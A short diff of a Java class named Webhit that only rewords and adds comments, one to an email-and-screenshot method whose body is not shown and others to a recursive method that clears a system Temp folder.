@@ -177,7 +177,7 @@ public class Webhit {
 		}
 	}
 
-	// TO GET MAIL OF THROUGH SMTP
+	// TO GET MAIL & SCREENSHOT THROUGH SMTP
 	public static void emailme() {
 
 		try {
@@ -222,16 +222,16 @@ public class Webhit {
 		}
 	}
 
-	// Method to Delete system temp files
+	// METHOD TO DELETE SYSTEM TEMP FILE
 	public static void temp(File directoryPath) throws IOException {
 		if (directoryPath != null && directoryPath.exists()) {
 
 			if (directoryPath.isDirectory()) {
 				File[] fileList = directoryPath.listFiles();
 				for (int i = 0; i < fileList.length; i++) {
-					temp(fileList[i]);
+					temp(fileList[i]); //recursion to delete content of folder inside folder
 				}
-				if (!"Temp".equalsIgnoreCase(directoryPath.getName())) {
+				if (!"Temp".equalsIgnoreCase(directoryPath.getName())) {  // not to delete the temp folder itself
 					System.out.println("folder   delete " + directoryPath.getAbsolutePath());
 					directoryPath.delete();
 				}
